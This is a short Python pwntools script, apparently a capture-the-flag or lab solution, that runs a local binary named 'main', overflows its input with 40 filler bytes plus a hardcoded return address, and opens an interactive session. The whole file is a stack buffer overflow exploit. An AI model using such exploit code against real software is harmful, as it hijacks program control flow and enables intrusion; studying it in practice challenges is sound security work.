from pwn import *

p = process('../app/main')
payload = b'A'*40+p64(0x0000000000401156)
p.sendline(payload)
p.interactive()